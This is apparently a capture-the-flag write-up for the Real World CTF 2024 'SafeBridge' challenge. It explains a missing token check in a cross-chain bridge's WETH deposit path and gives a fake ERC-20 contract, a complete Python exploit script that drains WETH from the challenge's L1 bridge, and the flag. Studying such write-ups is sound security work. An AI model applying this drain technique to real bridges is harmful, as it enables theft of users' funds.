---
title: Blockchain - SafeBridge
description: 2024 | Real World CTF | Blockchain
tags:
    - smart contract
    - cross chain
    - data validation
---

## Description

I've crafted what I believed to be an ultra-safe token bridge. Don't believe it?

> nc 47.251.56.125 1337

[:material-download: `safebridge.zip`](static/safebridge.zip)

## Solution

- This challenge is derived from [Enterprise Blockchain](paradigm/enterprise_blockchain.md) in Paradigm CTF 2023. The `CrossDomainMessenger.sendMessage()` function, which can be used for sending cross-chain messages, is still public available. The difference is that when finalizing a cross-chain token transfer, it will verify whether the initiator of the cross-chain message is the bridge on the corresponding chain. Thus, cross-chain token transfers are only possible via `L1ERC20Bridge.depositERC20() / L1ERC20Bridge.depositERC20To()` and `L2ERC20Bridge.withdraw() / L2ERC20Bridge.withdrawTo()`

    ```js
    function finalizeERC20Withdrawal(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
        public
        onlyFromCrossDomainAccount(l2TokenBridge)
    {
        deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] - _amount;
        IERC20(_l1Token).safeTransfer(_to, _amount);
        emit ERC20WithdrawalFinalized(_l1Token, _l2Token, _from, _to, _amount);
    }

    modifier onlyFromCrossDomainAccount(address _sourceDomainAccount) {
        require(msg.sender == address(getCrossDomainMessenger()), "messenger contract unauthenticated");

        require(
            getCrossDomainMessenger().xDomainMessageSender() == _sourceDomainAccount,
            "wrong sender of cross-domain message"
        );

        _;
    }
    ```

- To withdraw WETH from L1Bridge, we need to invoke the `L2ERC20Bridge.withdraw()` function. In `_initiateWithdrawal()`, `l1Token` is read from `_l2Token`. Since the `_l2Token` provided by users could be a custom token, then only the value of `L1ERC20Bridge.deposits[weth][_l2Token]` should not be less than the amount to be transferred

    ```js
    function withdraw(address _l2Token, uint256 _amount) external virtual {
        _initiateWithdrawal(_l2Token, msg.sender, msg.sender, _amount);
    }

    function _initiateWithdrawal(address _l2Token, address _from, address _to, uint256 _amount) internal {
        IL2StandardERC20(_l2Token).burn(msg.sender, _amount);

        address l1Token = IL2StandardERC20(_l2Token).l1Token();
        bytes memory message;
        if (_l2Token == Lib_PredeployAddresses.L2_WETH) {
            message = abi.encodeWithSelector(IL1ERC20Bridge.finalizeWethWithdrawal.selector, _from, _to, _amount);
        } else {
            message = abi.encodeWithSelector(
                IL1ERC20Bridge.finalizeERC20Withdrawal.selector, l1Token, _l2Token, _from, _to, _amount
            );
        }

        sendCrossDomainMessage(l1TokenBridge, message);

        emit WithdrawalInitiated(l1Token, _l2Token, msg.sender, _to, _amount);
    }
    ```

- When initiating a transfer from L1 to L2, if `_l1Token` is `weth`, the corresponding amount of `L2_WETH` will be minted in `L2ERC20Bridge.finalizeDeposit()`. However, `_l2Token` may not be `L2_WETH`. If `_l2Token` is a custom token controlled by the player, not only can player obtain `L2_WETH`, but `deposits[weth][_l2Token]` will also increase

    ```js
    function depositERC20(address _l1Token, address _l2Token, uint256 _amount) external virtual {
        _initiateERC20Deposit(_l1Token, _l2Token, msg.sender, msg.sender, _amount);
    }

    function _initiateERC20Deposit(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
            internal
    {
        IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);

        bytes memory message;
        if (_l1Token == weth) { // @audit-issue no check if _l2Token is L2_WETH
            message = abi.encodeWithSelector(
                IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.L2_WETH, _from, _to, _amount
            );
        } else {
            message =
                abi.encodeWithSelector(IL2ERC20Bridge.finalizeDeposit.selector, _l1Token, _l2Token, _from, _to, _amount);
        }

        sendCrossDomainMessage(l2TokenBridge, message);
        deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;

        emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount);
    }
    ```

- Since `deposits[weth][L2_WETH]` already has a value, we can drain WETH in l1Bridge with `L2_WETH` and custom `_l2Token`

### Exploitation

```js
contract FakeL2StandardERC20 is L2StandardERC20 {
    constructor(address _l1Token) L2StandardERC20(_l1Token, "FAKE", "FAKE") {}

    function mint(address _to, uint256 _amount) public override {
        _mint(_to, _amount);
    }
}
```

```py
import pwn
from cheb3 import Connection
from cheb3.utils import load_compiled

fake_abi, fake_bin = load_compiled('L2StandardERC20.sol', 'FakeL2StandardERC20')
challenge_abi, _ = load_compiled('Challenge.sol')
weth_abi, _ = load_compiled('WETH.sol')
l1bridge_abi, _ = load_compiled('L1ERC20Bridge.sol')
l2bridge_abi, _ = load_compiled('L2ERC20Bridge.sol')

L2_ERC20_BRIDGE = "0x420000000000000000000000000000000000baBe"
L2_WETH = "0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000"
AMOUNT = int(2e18)

HOST = "47.251.56.125"
PORT = 1337
TOKEN = "<team-token>"
svr = pwn.remote(HOST, PORT)
svr.sendlineafter(b"token?", TOKEN)
svr.sendlineafter(b"action?", b"1")

svr.recvuntil(b"rpc endpoints:")
l1 = Connection(svr.recvline_contains(b"l1").replace(b"-", b"").strip().decode())
l2 = Connection(svr.recvline_contains(b"l2").replace(b"-", b"").strip().decode())

priv = svr.recvline_contains(b"private").split(b":")[-1].strip().decode()
challenge_addr = svr.recvline_contains(b"challenge").split(b":")[-1].strip().decode()
svr.close()

l1account = l1.account(priv)
l2account = l2.account(priv)

challenge = l1.contract(l1account, address=challenge_addr, abi=challenge_abi)
weth_addr = challenge.caller.WETH()
l1bridge_addr = challenge.caller.BRIDGE()

# deploy the custom token
fake = l2.contract(l2account, abi=fake_abi, bytecode=fake_bin)
fake.deploy(weth_addr)

# obtain L2_WETH and increase deposits[weth][fake]
weth = l1.contract(l1account, address=weth_addr, abi=weth_abi)
weth.functions.deposit().send_transaction(value=AMOUNT)
weth.functions.approve(l1bridge_addr, AMOUNT).send_transaction()
l1bridge = l1.contract(l1account, address=l1bridge_addr, abi=l1bridge_abi)
l1bridge.functions.depositERC20(weth_addr, fake.address, AMOUNT).send_transaction()

# withdraw
fake.functions.mint(l2account.address, AMOUNT).send_transaction()
fake.functions.approve(L2_ERC20_BRIDGE, AMOUNT).send_transaction()
l2bridge = l2.contract(l2account, address=L2_ERC20_BRIDGE, abi=l2bridge_abi)
l2bridge.functions.withdraw(fake.address, AMOUNT).send_transaction()

l2weth = l2.contract(l2account, address=L2_WETH, abi=weth_abi)
l2weth.functions.approve(L2_ERC20_BRIDGE, AMOUNT).send_transaction()
l2bridge.functions.withdraw(L2_WETH, AMOUNT).send_transaction()

assert challenge.caller.isSolved()

svr = pwn.remote(HOST, PORT)
svr.sendlineafter(b"token?", TOKEN)
svr.sendlineafter(b"action?", b"3")
svr.interactive()
```

### Flag

> rwctf{yoU_draINED_BriD6E}